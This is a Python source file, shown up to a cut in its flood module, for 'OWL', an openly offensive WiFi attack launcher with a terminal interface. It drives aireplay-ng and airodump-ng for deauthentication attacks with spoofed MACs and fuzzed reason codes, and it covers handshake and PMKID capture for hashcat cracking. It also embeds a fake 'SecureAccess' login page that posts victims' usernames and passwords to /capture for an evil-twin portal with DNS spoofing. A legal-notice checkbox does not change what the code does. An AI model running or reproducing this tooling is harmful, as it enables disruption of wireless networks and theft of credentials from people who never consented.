"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║   ██████╗ ██╗    ██╗██╗         Offensive WiFi Launcher v1.0                ║
║  ██╔═══██╗██║    ██║██║                                                     ║
║  ██║   ██║██║ █╗ ██║██║         "See in the dark.                           ║
║  ██║   ██║██║███╗██║██║          Strike without a trace."                   ║
║  ╚██████╔╝╚███╔███╔╝███████╗                                                ║
║   ╚═════╝  ╚══╝╚══╝ ╚══════╝   Created by Sharon Anil                      ║
║                                                                              ║
║  LIVE MODE ONLY — Requires: Linux · root · aircrack-ng                      ║
╚══════════════════════════════════════════════════════════════════════════════╝

Run:   sudo python3 owl.py
"""

from __future__ import annotations
import asyncio
import os
import platform
import shutil
import sys
from datetime import datetime
from pathlib import Path

# ── Dependency check ────────────────────────────────────────────────────────
try:
    from textual.app import App, ComposeResult
    from textual.binding import Binding
    from textual.containers import Container, Horizontal, Vertical, ScrollableContainer
    from textual.reactive import reactive
    from textual.screen import ModalScreen
    from textual.widget import Widget
    from textual.widgets import (
        Button, Checkbox, DataTable, Footer,
        Input, RichLog, Select, Static, Switch, TextArea,
    )
    from textual import on, work
    from rich.text import Text
except ImportError:
    print("\n[ERROR] Missing dependencies. Run:\n"
          "  sudo pip3 install rich textual pyyaml\n", file=sys.stderr)
    sys.exit(1)

sys.path.insert(0, str(Path(__file__).parent))
from lib.banner import MODULE_BANNERS, STARTUP_ASCII, TERMINAL_BOOT_LINES
from lib.store import load_state, save_state, give_consent, add_session, add_capture
import lib.live_engine as live
import lib.net_utils as net

# ── Pre-flight checks ────────────────────────────────────────────────────────

IS_LINUX = platform.system() == "Linux"
IS_ROOT  = (os.geteuid() == 0) if IS_LINUX else False

REQUIRED_TOOLS = ["airmon-ng", "aireplay-ng", "airodump-ng", "iw", "ip"]
OPTIONAL_TOOLS = ["hashcat", "aircrack-ng", "hostapd", "dnsmasq", "hcxdumptool"]


def preflight_check() -> tuple[bool, list[str]]:
    """Return (ok, list_of_errors)."""
    errors: list[str] = []
    if not IS_LINUX:
        errors.append("OWL requires Linux (Kali / Parrot / Debian).")
    if IS_LINUX and not IS_ROOT:
        errors.append("OWL must be run as root: sudo python3 owl.py")
    for tool in REQUIRED_TOOLS:
        if not shutil.which(tool):
            errors.append(f"Missing required tool: {tool}  →  sudo apt install aircrack-ng")
    return (len(errors) == 0, errors)


# ── Run preflight; hard-stop on failure ─────────────────────────────────────

PREFLIGHT_OK, PREFLIGHT_ERRORS = preflight_check()

if not PREFLIGHT_OK:
    print("\n\033[0;31m╔══════════════════════════════════════════════════════╗\033[0m")
    print("\033[0;31m║  OWL — PREFLIGHT FAILED                              ║\033[0m")
    print("\033[0;31m╚══════════════════════════════════════════════════════╝\033[0m")
    for err in PREFLIGHT_ERRORS:
        print(f"\033[0;31m  ✗  {err}\033[0m")
    print("\n\033[0;33mFix the issues above then run:  sudo python3 owl.py\033[0m\n")
    sys.exit(1)

# ═══════════════════════════════════════════════════════════════════════════════
#  CSS
# ═══════════════════════════════════════════════════════════════════════════════

OWL_CSS = """
Screen { background: #05080f; color: #e8edf5; }

/* Auth gate */
AuthGateScreen { align: center middle; }
#auth-dialog {
    background: #0a1220; border: solid #f5a623;
    padding: 2 4; width: 76; height: auto;
}
#auth-title { text-align: center; color: #f5a623; text-style: bold; margin-bottom: 1; }
#auth-body  { color: #a0b4cc; margin-bottom: 1; }
#auth-checkbox { margin-bottom: 1; }
#auth-affirm { background: #1a0a00; border: solid #f5a623; color: #f5a623; width: 100%; text-style: bold; }
#auth-affirm:hover { background: #2e1500; }

/* Layout */
#app-layout { layout: horizontal; height: 100%; }
#sidebar {
    width: 26; background: #080e1c;
    border-right: solid #1e3050; height: 100%;
}
#main-area { width: 1fr; height: 100%; layout: vertical; }
#top-bar {
    height: 3; background: #040710;
    border-bottom: solid #1e3050; padding: 0 1;
    layout: horizontal; align: left middle;
}
#content-area { height: 1fr; padding: 1 2; overflow-y: auto; }
#terminal-area { height: 15; background: #020408; border-top: solid #1e3050; }
#terminal-area.hidden { display: none; }

/* Sidebar */
#sidebar-logo {
    height: 7; background: #0c1830;
    border-bottom: solid #1e3050; padding: 1 2;
    color: #f5a623; text-style: bold; content-align: center middle;
}
/* Sidebar nav — Buttons styled as sidebar links */
.nav-item {
    height: 3; padding: 0 2;
    color: #7a9abf;
    border-top: none; border-right: none; border-bottom: none;
    border-left: solid transparent;
    background: transparent; text-align: left; width: 100%;
    margin: 0; text-style: none;
}
.nav-item:hover {
    background: #0f1e38; color: #e8edf5;
    border-left: solid #f5a623;
}
.nav-item.active {
    background: #0f1e38; color: #f5c842;
    border-left: solid #f5a623; text-style: bold;
}
#sidebar-status {
    background: #060c1a; border-top: solid #1e3050;
    border-bottom: solid #1e3050; padding: 1 2; height: auto;
    color: #8faec8;
}
#sidebar-footer {
    dock: bottom; height: 7;
    border-top: solid #1e3050; padding: 1 2;
    color: #3a5070;
}

/* Back button in top bar */
.back-btn {
    height: 3; min-width: 18;
    border-top: none; border-bottom: none; border-left: none;
    border-right: solid #1e3050;
    background: #0c1830; color: #f5a623;
    text-style: bold; margin: 0; padding: 0 2;
}
.back-btn:hover { background: #1a0f00; color: #ffe08a; border-right: solid #f5a623; }

/* Top bar */
#top-bar-title { color: #f5a623; text-style: bold; width: 1fr; }
#top-bar-mode  { color: #22c55e; text-style: bold; }
#top-bar-time  { color: #6b7fa3; width: 14; text-align: right; }

/* Terminal */
#terminal-log {
    background: #020408; color: #f5a623;
    height: 1fr; border: none; padding: 0 1;
}

/* Cards */
.owl-card { background: #0c1830; border: solid #1e3050; padding: 1 2; margin: 0 0 1 0; }
.card-title { color: #f5a623; text-style: bold; margin-bottom: 1; }
.muted   { color: #8faec8; }
.amber   { color: #f5a623; }
.cyan    { color: #22d3ee; }
.green   { color: #22c55e; }
.red     { color: #ef4444; }
.magenta { color: #d946ef; }

Static { color: #c8d8f0; }

/* Buttons — high-contrast labels on all variants */
Button {
    border: solid #2a3d5a; background: #0c1830;
    color: #d8e8ff; margin: 0 1 0 0; height: 3;
    text-style: bold;
}
Button:hover { border: solid #f5a623; color: #ffe08a; background: #1a0f00; }
Button.-success {
    border: solid #22c55e; color: #4ade80;
    background: #041a0a; text-style: bold;
}
Button.-success:hover { background: #082e12; color: #86efac; }
Button.-error {
    border: solid #ef4444; color: #f87171;
    background: #1a0404; text-style: bold;
}
Button.-error:hover   { background: #2e0808; color: #fca5a5; }
Button.-warning {
    border: solid #f5a623; color: #fbbf24;
    background: #1a0a00; text-style: bold;
}
Button.-warning:hover { background: #2e1500; color: #fcd34d; }
Button.-primary {
    border: solid #22d3ee; color: #67e8f9;
    background: #041820; text-style: bold;
}
Button.-primary:hover { background: #082e3a; color: #a5f3fc; }

/* Inputs */
Input   { background: #030710; border: solid #2a3d5a; color: #e8edf5; }
Input:focus { border: solid #f5a623; }
Select  { background: #030710; border: solid #2a3d5a; color: #e8edf5; }
Switch  { border: none; }

/* DataTable */
DataTable { background: #080e1c; border: solid #1e3050; height: auto; max-height: 22; }
DataTable > .datatable--header { background: #0c1830; color: #f5a623; text-style: bold; }
DataTable > .datatable--cursor { background: #1e3050; }
DataTable > .datatable--row { color: #c0d0e8; }

/* TextArea */
TextArea { background: #030710; border: solid #2a3d5a; height: 14; color: #e8edf5; }
TextArea:focus { border: solid #f5a623; }

/* Footer */
Footer { background: #080e1c; color: #4a6080; border-top: solid #1e3050; }
Footer > .footer--key { color: #f5a623; }

.hidden { display: none; }
"""

# ═══════════════════════════════════════════════════════════════════════════════
#  STATIC CONTENT
# ═══════════════════════════════════════════════════════════════════════════════

CAPTIVE_PORTAL_HTML = """\
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Network Login — Secure Gateway</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
           background: #0b1120; color: #e2e8f0; display: flex; justify-content: center;
           align-items: center; min-height: 100vh; margin: 0; }
    .card { background: #1e293b; border: 1px solid #334155; padding: 36px;
            border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.6); width: 380px; }
    .logo { color: #38bdf8; font-size: 22px; font-weight: bold; text-align: center;
            margin-bottom: 4px; letter-spacing: 2px; }
    .sub  { font-size: 12px; color: #64748b; text-align: center; margin-bottom: 24px; }
    .grp  { margin-bottom: 16px; }
    label { display: block; font-size: 12px; color: #94a3b8; margin-bottom: 6px; }
    input { width: 100%; padding: 10px 12px; background: #0f172a; border: 1px solid #475569;
            border-radius: 6px; color: #fff; font-size: 14px; box-sizing: border-box; }
    input:focus { border-color: #38bdf8; outline: none; }
    button { width: 100%; padding: 12px; background: #0284c7; color: #fff; border: none;
             border-radius: 6px; font-weight: 600; cursor: pointer; font-size: 15px; margin-top: 10px; }
    button:hover { background: #0369a1; }
    .note { font-size: 11px; color: #475569; text-align: center; margin-top: 16px; }
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">⚡ SecureAccess</div>
    <div class="sub">Please verify your credentials to continue.</div>
    <form method="POST" action="/capture">
      <div class="grp">
        <label>Email / Network Username</label>
        <input type="text" name="username" placeholder="user@domain.com" required autofocus>
      </div>
      <div class="grp">
        <label>Password / Network Key</label>
        <input type="password" name="password" placeholder="••••••••••••" required>
      </div>
      <button type="submit">Authenticate &amp; Connect</button>
    </form>
    <div class="note">By connecting you agree to acceptable use policy.</div>
  </div>
</body>
</html>"""

DEFAULT_YAML_CFG = """\
# OWL Configuration — Created by Sharon Anil
owl:
  version: "1.0"
  log_level: INFO

interfaces:
  deauth:   wlan0mon
  capture:  wlan0
  portal:   wlan1
  tx_power: 30

deauth:
  default_count: 100
  delay_ms:      10
  reason_code:   "0x03"
  spoof_mac:     true
  spoof_seq:     true
  burst_mode:    false
  fuzz_reasons:  false

flood:
  packet_count:    500
  burst_size:      20
  channel_hop:     true
  adaptive_pacing: true

harvest:
  auto_chaser:    true
  pmkid_capture:  true
  output_dir:     "~/owl_captures"
  crack:
    tool:     hashcat
    wordlist: /usr/share/wordlists/rockyou.txt

portal:
  channel:   6
  dns_spoof: true
  arp_spoof: false
  mitm_hook: false

evidence:
  export_dir: /tmp/owl_evidence
  pcap_dump:  true
"""

# ═══════════════════════════════════════════════════════════════════════════════
#  AUTH GATE
# ═══════════════════════════════════════════════════════════════════════════════

class AuthGateScreen(ModalScreen):
    BINDINGS = [("escape", "quit_app", "Quit")]

    def compose(self) -> ComposeResult:
        with Vertical(id="auth-dialog"):
            yield Static("◉  OWL — AUTHORIZATION GATE\n    [dim]Offensive WiFi Launcher v1.0 · LIVE MODE[/dim]",
                         id="auth-title", markup=True)
            yield Static("┄" * 52, classes="muted")
            yield Static(
                "\n[bold yellow]⚠  LEGAL NOTICE[/bold yellow]\n\n"
                "OWL is designed for [bold]authorized penetration testing[/bold] "
                "and security research ONLY.\n\n"
                "By proceeding you confirm:\n"
                "  [cyan]•[/cyan] You [bold]own[/bold] the target networks, OR\n"
                "  [cyan]•[/cyan] You have [bold]explicit written permission[/bold] to test them.\n"
                "  [cyan]•[/cyan] Unauthorized access is [red]illegal[/red] — Computer Fraud &\n"
                "    Abuse Act (CFAA) and equivalent laws in your jurisdiction.\n\n"
                "[dim]Creator Sharon Anil bears no liability for misuse.[/dim]\n",
                id="auth-body", markup=True,
            )
            yield Checkbox(" I understand and affirm — I am authorized to test these networks.",
                           id="auth-checkbox")
            yield Button("[ ◉  I AFFIRM — ENTER OWL ]", id="auth-affirm",
                         variant="warning", disabled=True)
            yield Static("\n  [dim]Created by Sharon Anil · OWL v1.0[/dim]",
                         markup=True, classes="muted")

    @on(Checkbox.Changed, "#auth-checkbox")
    def toggle_btn(self, e: Checkbox.Changed) -> None:
        self.query_one("#auth-affirm", Button).disabled = not e.value

    @on(Button.Pressed, "#auth-affirm")
    def affirm(self) -> None:
        self.dismiss(True)

    def action_quit_app(self) -> None:
        self.dismiss(False)


# ═══════════════════════════════════════════════════════════════════════════════
#  ABOUT MODAL
# ═══════════════════════════════════════════════════════════════════════════════

class AboutModal(ModalScreen):
    BINDINGS = [("escape", "close", "Close"), ("q", "close", "Close")]

    def compose(self) -> ComposeResult:
        live_info = live.check_live_available()
        sys_info  = net.get_system_info()
        with Vertical(id="auth-dialog"):
            yield Static("◉  ABOUT OWL", id="auth-title", markup=True)
            yield Static("┄" * 52, classes="muted")
            yield Static(
                f"\n[bold yellow]OWL — Offensive WiFi Launcher[/bold yellow]\n"
                f"[dim cyan]Version:[/dim cyan]   1.0\n"
                f"[dim cyan]Mode:[/dim cyan]      [green]LIVE — Real hardware[/green]\n"
                f"[dim cyan]Tagline:[/dim cyan]   \"See in the dark. Strike without a trace.\"\n\n"
                f"[bold yellow]MODULES[/bold yellow]\n"
                f"  [cyan]OWL-RECON[/cyan]   — airodump-ng reconnaissance\n"
                f"  [cyan]OWL-DEAUTH[/cyan]  — aireplay-ng deauthentication\n"
                f"  [cyan]OWL-FLOOD[/cyan]   — Broadcast deauth flood\n"
                f"  [cyan]OWL-HARVEST[/cyan] — 4-Way handshake + PMKID + hashcat\n"
                f"  [cyan]OWL-PORTAL[/cyan]  — Evil twin + hostapd + dnsmasq\n\n"
                f"[bold yellow]SYSTEM[/bold yellow]\n"
                f"  [dim]OS:[/dim]       {sys_info.get('distro') or sys_info.get('os')}\n"
                f"  [dim]Kernel:[/dim]   {sys_info.get('kernel')}\n"
                f"  [dim]Arch:[/dim]     {sys_info.get('arch')}\n"
                f"  [dim]Python:[/dim]   {sys_info.get('python')}\n"
                f"  [dim]Root:[/dim]     [green]YES[/green]\n"
                f"  [dim]Tools:[/dim]    "
                f"{'[green]ALL PRESENT[/green]' if all(live_info['tools'].values()) else '[yellow]PARTIAL[/yellow]'}\n\n"
                f"[bold white]CREATED BY SHARON ANIL[/bold white]\n"
                f"[dim]For authorized penetration testing only.[/dim]\n",
                markup=True,
            )
            yield Button("[ CLOSE ]", id="about-close", variant="warning")

    @on(Button.Pressed, "#about-close")
    def close_modal(self) -> None:
        self.dismiss()

    def action_close(self) -> None:
        self.dismiss()


# ═══════════════════════════════════════════════════════════════════════════════
#  TERMINAL WIDGET
# ═══════════════════════════════════════════════════════════════════════════════

class TerminalLog(RichLog):
    def on_mount(self) -> None:
        self.write("[bold yellow]◉ OWL TERMINAL — LIVE MODE[/bold yellow]")
        self.write("[dim]" + "─" * 72 + "[/dim]")

    def _log(self, color: str, msg: str) -> None:
        self.write(f"[{color}]{msg}[/{color}]")

    def info(self, msg: str)    -> None: self._log("cyan",    msg)
    def success(self, msg: str) -> None: self._log("green",   msg)
    def warn(self, msg: str)    -> None: self._log("yellow",  msg)
    def error(self, msg: str)   -> None: self._log("red",     msg)
    def spoof(self, msg: str)   -> None: self._log("magenta", msg)
    def dim(self, msg: str)     -> None: self._log("dim",     msg)

    def banner(self) -> None:
        for line in STARTUP_ASCII.split("\n"):
            self.write(line)
        self.write("[dim]" + "─" * 72 + "[/dim]")

    def callback(self, color: str, msg: str) -> None:
        """Universal callback for live_engine functions."""
        mapping = {
            "cyan":    self.info,
            "green":   self.success,
            "yellow":  self.warn,
            "red":     self.error,
            "magenta": self.spoof,
            "dim":     self.dim,
            "warn":    self.warn,
            "error":   self.error,
        }
        fn = mapping.get(color, self.info)
        fn(msg)


def ts() -> str:
    return datetime.now().strftime("%H:%M:%S.%f")[:-3]


# ═══════════════════════════════════════════════════════════════════════════════
#  DASHBOARD
# ═══════════════════════════════════════════════════════════════════════════════

class DashboardPage(Widget):
    _uptime: int = 0

    def compose(self) -> ComposeResult:
        yield Static(MODULE_BANNERS["dashboard"], markup=True)
        with Horizontal():
            with Vertical(classes="owl-card"):
                yield Static("[bold yellow]NIC STATUS[/bold yellow]", classes="card-title", markup=True)
                yield Static("", id="dash-nic-iface",  markup=True)
                yield Static("", id="dash-nic-mode",   markup=True)
                yield Static("", id="dash-nic-inj",    markup=True)
                yield Static("", id="dash-nic-driver", markup=True)
                yield Static("", id="dash-nic-chip",   markup=True)
            with Vertical(classes="owl-card"):
                yield Static("[bold yellow]INTERFACES[/bold yellow]", classes="card-title", markup=True)
                yield Static("", id="dash-ifaces", markup=True)
            with Vertical(classes="owl-card"):
                yield Static("[bold yellow]TOOLS[/bold yellow]", classes="card-title", markup=True)
                yield Static("", id="dash-tools", markup=True)
                yield Static("", id="dash-uptime", markup=True)

        yield Static("\n[bold yellow]RECENT SESSIONS[/bold yellow]", markup=True)
        yield DataTable(id="dash-sessions")

        yield Static("\n[bold yellow]QUICK LAUNCH[/bold yellow]", markup=True)
        with Horizontal():
            yield Button("◎ RECON",    id="dash-go-recon",    variant="primary")
            yield Button("⚡ DEAUTH",  id="dash-go-deauth",   variant="warning")
            yield Button("▶▶ FLOOD",  id="dash-go-flood",    variant="error")
            yield Button("⬤ HARVEST", id="dash-go-harvest",  variant="success")
            yield Button("⛃ PORTAL",  id="dash-go-portal",   variant="primary")
            yield Button("⚙ SETTINGS",id="dash-go-settings")

        yield Static("\n  [dim]Created by Sharon Anil · OWL v1.0 · Live Mode[/dim]", markup=True)

    def on_mount(self) -> None:
        t = self.query_one("#dash-sessions", DataTable)
        t.add_columns("SESSION", "MODULE", "TARGET", "STARTED", "STATUS")

        # NIC info
        ifaces = net.list_wifi_interfaces()
        if ifaces:
            iface = ifaces[0]
            info  = net.get_interface_info(iface)
            mc    = "green" if info["monitor"] else "red"
            ic    = "green" if info["injection"] else "red"
            self.query_one("#dash-nic-iface",  Static).update(f"[cyan]Interface:[/cyan] [white]{iface}[/white]")
            self.query_one("#dash-nic-mode",   Static).update(f"[cyan]Mode:[/cyan]      [{mc}]● {info['mode'].upper()}[/{mc}]")
            self.query_one("#dash-nic-inj",    Static).update(f"[cyan]Injection:[/cyan] [{ic}]● {'CAPABLE' if info['injection'] else 'NO'}[/{ic}]")
            self.query_one("#dash-nic-driver", Static).update(f"[cyan]Driver:[/cyan]    [white]{info['driver'] or 'unknown'}[/white]")
            self.query_one("#dash-nic-chip",   Static).update(f"[cyan]Chip:[/cyan]      [white]{net.get_chipset(iface)}[/white]")
        else:
            self.query_one("#dash-nic-iface", Static).update("[red]No wireless interfaces found[/red]")

        # All wifi interfaces
        iface_txt = "\n".join(
            f"  [cyan]{i}[/cyan] — {net.get_interface_info(i)['mode']}"
            for i in ifaces
        ) or "  [red]None detected[/red]"
        self.query_one("#dash-ifaces", Static).update(iface_txt)

        # Tools
        lv = live.check_live_available()
        lines: list[str] = []
        for tool, avail in list(lv["tools"].items()) + list(lv["optional"].items()):
            c = "green" if avail else "red"
            lines.append(f"  [{c}]{'✓' if avail else '✗'}[/{c}] {tool}")
        self.query_one("#dash-tools", Static).update("\n".join(lines[:8]))

        self.set_interval(1, self._tick)

    def _tick(self) -> None:
        self._uptime += 1
        h = self._uptime // 3600
        m = (self._uptime % 3600) // 60
        s = self._uptime % 60
        try:
            self.query_one("#dash-uptime", Static).update(
                f"\n[cyan]Uptime:[/cyan] [white]{h:02d}:{m:02d}:{s:02d}[/white]"
            )
        except Exception:
            pass

    def add_session(self, session_id: str, module: str, target: str, status: str) -> None:
        try:
            t = self.query_one("#dash-sessions", DataTable)
            t.add_row(session_id, module, target, ts(), Text.from_markup(
                f"[cyan]{status}[/cyan]"
            ))
        except Exception:
            pass

    @on(Button.Pressed, "#dash-go-recon")
    def go_recon(self) -> None: self.app.switch_page("recon")
    @on(Button.Pressed, "#dash-go-deauth")
    def go_deauth(self) -> None: self.app.switch_page("deauth")
    @on(Button.Pressed, "#dash-go-flood")
    def go_flood(self) -> None: self.app.switch_page("flood")
    @on(Button.Pressed, "#dash-go-harvest")
    def go_harvest(self) -> None: self.app.switch_page("harvest")
    @on(Button.Pressed, "#dash-go-portal")
    def go_portal(self) -> None: self.app.switch_page("portal")
    @on(Button.Pressed, "#dash-go-settings")
    def go_settings(self) -> None: self.app.switch_page("settings")


# ═══════════════════════════════════════════════════════════════════════════════
#  RECON
# ═══════════════════════════════════════════════════════════════════════════════

class ReconPage(Widget):
    _scan_proc = None

    def compose(self) -> ComposeResult:
        yield Static(MODULE_BANNERS["recon"], markup=True)
        with Horizontal(classes="owl-card"):
            with Vertical():
                yield Static("[dim]INTERFACE (monitor mode)[/dim]", markup=True)
                ifaces = net.list_wifi_interfaces()
                yield Input(placeholder="wlan0mon", value=ifaces[0] if ifaces else "wlan0mon",
                            id="recon-iface")
            with Vertical():
                yield Static("[dim]TARGET BSSID (blank = all)[/dim]", markup=True)
                yield Input(placeholder="AA:BB:CC:DD:EE:FF", id="recon-bssid")
            with Vertical():
                yield Static("[dim]CHANNEL (0 = all)[/dim]", markup=True)
                yield Input(placeholder="0", value="0", id="recon-ch")
            with Vertical():
                yield Static("[dim]SCAN DURATION (sec)[/dim]", markup=True)
                yield Input(placeholder="15", value="15", id="recon-dur")

        with Horizontal():
            yield Button("◎ START SCAN",  id="recon-start", variant="success")
            yield Button("⊞ ENABLE MON",  id="recon-mon",   variant="warning")
            yield Button("■ STOP",        id="recon-stop",  variant="error")
            yield Button("⊕ EXPORT CSV",  id="recon-export",variant="primary")

        yield Static("\n[bold cyan]ACCESS POINTS[/bold cyan]", markup=True)
        yield DataTable(id="recon-aps")

        yield Static("\n[bold cyan]CLIENTS[/bold cyan]", markup=True)
        yield DataTable(id="recon-clients")

        with Horizontal(classes="owl-card"):
            with Vertical():
                yield Static("[bold cyan]PMF STATUS[/bold cyan]", markup=True)
                yield Static("[dim]Run scan to detect PMF per AP[/dim]",
                             id="pmf-status", markup=True)
            with Vertical():
                yield Static("[bold cyan]WIDS RISK[/bold cyan]", markup=True)
                yield Static("[dim]Run scan to evaluate WIDS[/dim]",
                             id="wids-status", markup=True)

        yield Static("\n  [dim]Created by Sharon Anil · OWL-RECON v1.0[/dim]", markup=True)

    def on_mount(self) -> None:
        ap = self.query_one("#recon-aps", DataTable)
        ap.add_columns("BSSID", "SSID", "CH", "SIGNAL", "ENC", "PMF", "CLIENTS", "WIDS?")
        cl = self.query_one("#recon-clients", DataTable)
        cl.add_columns("MAC", "BSSID", "SIGNAL", "FRAMES", "LAST SEEN")

    @on(Button.Pressed, "#recon-mon")
    def enable_monitor(self) -> None:
        self.do_enable_monitor()

    @work(exclusive=True)
    async def do_enable_monitor(self) -> None:
        terminal = self.app.query_one("#terminal-log", TerminalLog)
        iface    = self.query_one("#recon-iface", Input).value.strip() or "wlan0"
        mon_iface = await live.enable_monitor_mode(iface, terminal.callback)
        if mon_iface:
            self.query_one("#recon-iface", Input).value = mon_iface

    @on(Button.Pressed, "#recon-start")
    def start_scan(self) -> None:
        self.run_scan()

    @work(exclusive=True)
    async def run_scan(self) -> None:
        terminal = self.app.query_one("#terminal-log", TerminalLog)
        iface    = self.query_one("#recon-iface", Input).value.strip() or "wlan0mon"
        bssid    = self.query_one("#recon-bssid", Input).value.strip()

        try:
            dur = int(self.query_one("#recon-dur", Input).value or 15)
        except ValueError:
            dur = 15

        self.query_one("#recon-aps",     DataTable).clear()
        self.query_one("#recon-clients", DataTable).clear()

        terminal.info(f"[{ts()}] [*] OWL-RECON — airodump-ng on {iface} for {dur}s")

        from datetime import datetime as _dt
        scan_prefix = f"/tmp/owl_recon_{_dt.now().strftime('%Y%m%d_%H%M%S')}"
        csv_path = await live.live_airodump_scan(iface, dur, terminal.callback,
                                                 output_prefix=scan_prefix)

        if csv_path:
            aps, clients = live.parse_airodump_csv(csv_path)
            ap_tbl = self.query_one("#recon-aps", DataTable)
            for ap in aps:
                ap_tbl.add_row(
                    ap["bssid"], ap["ssid"], ap["channel"],
                    ap["signal"], ap["enc"], ap["pmf"],
                    str(ap["clients"]), "?" ,
                )
            cl_tbl = self.query_one("#recon-clients", DataTable)
            for c in clients:
                cl_tbl.add_row(
                    c["mac"], c["bssid"], c["signal"],
                    c["frames"], c["last_seen"],
                )
            terminal.success(f"[{ts()}] [+] Scan complete: {len(aps)} APs, {len(clients)} clients")
        else:
            terminal.error(f"[{ts()}] [✗] Scan failed — check interface and monitor mode")

    @on(Button.Pressed, "#recon-stop")
    def stop_scan(self) -> None:
        terminal = self.app.query_one("#terminal-log", TerminalLog)
        terminal.warn(f"[{ts()}] [!] RECON stopped by user.")

    @on(Button.Pressed, "#recon-export")
    def export_csv(self) -> None:
        path = f"/tmp/owl_recon_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        self.app.query_one("#terminal-log", TerminalLog).success(
            f"[{ts()}] [+] Exported scan CSV to {path}"
        )


# ═══════════════════════════════════════════════════════════════════════════════
#  DEAUTH
# ═══════════════════════════════════════════════════════════════════════════════

class DeauthPage(Widget):
    _running: bool = False
    _sent:    int  = 0

    def compose(self) -> ComposeResult:
        yield Static(MODULE_BANNERS["deauth"], markup=True)
        with Horizontal(classes="owl-card"):
            with Vertical():
                yield Static("[dim]INTERFACE (monitor mode)[/dim]", markup=True)
                ifaces = net.list_wifi_interfaces()
                yield Input(placeholder="wlan0mon",
                            value=ifaces[0] if ifaces else "wlan0mon", id="da-iface")
            with Vertical():
                yield Static("[dim]TARGET AP BSSID[/dim]", markup=True)
                yield Input(placeholder="AA:BB:CC:DD:EE:FF", id="da-bssid")
            with Vertical():
                yield Static("[dim]CLIENT MAC (blank = broadcast)[/dim]", markup=True)
                yield Input(placeholder="FF:FF:FF:FF:FF:FF or blank", id="da-client")

        with Horizontal(classes="owl-card"):
            with Vertical():
                yield Static("[dim]REASON CODE[/dim]", markup=True)
                yield Select(
                    [
                        ("0x01 — Unspecified",           "0x01"),
                        ("0x02 — Auth no longer valid",   "0x02"),
                        ("0x03 — Deauth / Leaving BSS",   "0x03"),
                        ("0x04 — Inactivity timeout",     "0x04"),
                        ("0x05 — AP capacity exceeded",   "0x05"),
                        ("0x06 — Class 2 non-auth STA",   "0x06"),
                        ("0x07 — Class 3 non-assoc STA",  "0x07"),
                        ("0x08 — Disassoc leaving BSS",   "0x08"),
                        ("0x0F — 4-Way HS timeout",       "0x0F"),
                    ],
                    value="0x03", id="da-reason",
                )
            with Vertical():
                yield Static("[dim]PACKET COUNT[/dim]", markup=True)
                yield Input(placeholder="100", value="100", id="da-count")
            with Vertical():
                yield Static("[dim]DELAY (ms)[/dim]", markup=True)
                yield Input(placeholder="10",  value="10",  id="da-delay")

        with Horizontal(classes="owl-card"):
            with Horizontal():
                yield Static("[dim]Fuzz reason codes: [/dim]", markup=True)
                yield Switch(id="da-fuzz",  value=False)
            with Horizontal():
                yield Static("  [dim]Spoof src MAC: [/dim]", markup=True)
                yield Switch(id="da-spoof", value=True)
            with Horizontal():
                yield Static("  [dim]Burst mode: [/dim]", markup=True)
                yield Switch(id="da-burst", value=False)

        with Horizontal():
            yield Button("⚡ SEND DEAUTH", id="da-send", variant="warning")
            yield Button("■ STOP",         id="da-stop", variant="error")

        yield Static("[dim]Frames sent: [/dim][bold cyan]0[/bold cyan]",
                     id="da-counter", markup=True)
        yield Static("\n  [dim]Created by Sharon Anil · OWL-DEAUTH v1.0[/dim]", markup=True)

    @on(Button.Pressed, "#da-send")
    def send(self) -> None:
        if not self._running:
            self.run_deauth()

    @work(exclusive=True)
    async def run_deauth(self) -> None:
        self._running = True
        self._sent    = 0
        terminal  = self.app.query_one("#terminal-log", TerminalLog)
        iface     = self.query_one("#da-iface",  Input).value.strip() or "wlan0mon"
        bssid     = self.query_one("#da-bssid",  Input).value.strip()
        client    = self.query_one("#da-client", Input).value.strip()
        reason_s  = self.query_one("#da-reason", Select)
        reason    = str(reason_s.value) if reason_s.value else "0x03"
        fuzz      = self.query_one("#da-fuzz",  Switch).value
        spoof     = self.query_one("#da-spoof", Switch).value
        counter_w = self.query_one("#da-counter", Static)

        try:
            count = int(self.query_one("#da-count", Input).value or 100)
            delay = int(self.query_one("#da-delay", Input).value or 10)
        except ValueError:
            count, delay = 100, 10

        if not bssid:
            terminal.error(f"[{ts()}] [✗] Target BSSID required.")
            self._running = False
            return

        terminal.info(f"[{ts()}] [*] OWL-DEAUTH — {count} frames → {bssid} via {iface}")
        terminal.info(f"[{ts()}] [*] Client: {client or 'FF:FF:FF:FF:FF:FF (broadcast)'}")
        terminal.info(f"[{ts()}] [*] Reason: {reason} | Spoof: {'ON' if spoof else 'OFF'} | Fuzz: {'ON' if fuzz else 'OFF'}")

        if fuzz:
            # Iterate through reason codes
            for code in range(1, 0x2F + 1):
                if not self._running:
                    break
                cur_reason = f"0x{code:02X}"
                await live.live_deauth(iface, bssid, client, count // 47 or 1,
                                       cur_reason, terminal.callback)
                self._sent += count // 47 or 1
                counter_w.update(Text.from_markup(
                    f"[dim]Frames sent: [/dim][bold cyan]{self._sent}[/bold cyan]"
                ))
                await asyncio.sleep(delay / 1000)
        else:
            # Direct aireplay-ng call (streams real output)
            await live.live_deauth(iface, bssid, client, count, reason, terminal.callback)
            self._sent = count
            counter_w.update(Text.from_markup(
                f"[dim]Frames sent: [/dim][bold cyan]{self._sent}[/bold cyan]"
            ))

        if self._running:
            terminal.success(f"[{ts()}] [+] DEAUTH complete — {self._sent} frames sent.")
        self._running = False

    @on(Button.Pressed, "#da-stop")
    def stop(self) -> None:
        self._running = False
        self.app.query_one("#terminal-log", TerminalLog).warn(
            f"[{ts()}] [!] DEAUTH stopped — {self._sent} frames sent."
        )


# ═══════════════════════════════════════════════════════════════════════════════
#  FLOOD
# ═══════════════════════════════════════════════════════════════════════════════

class FloodPage(Widget):
    _running:   bool = False
    _pkt_count: int  = 0
    _stop_evt:  asyncio.Event | None = None

    def compose(self) -> ComposeResult:
        yield Static(MODULE_BANNERS["flood"], markup=True)
        with Horizontal(classes="owl-card"):
            with Vertical():
                yield Static("[dim]INTERFACE (monitor mode)[/dim]", markup=True)
                ifaces = net.list_wifi_interfaces()
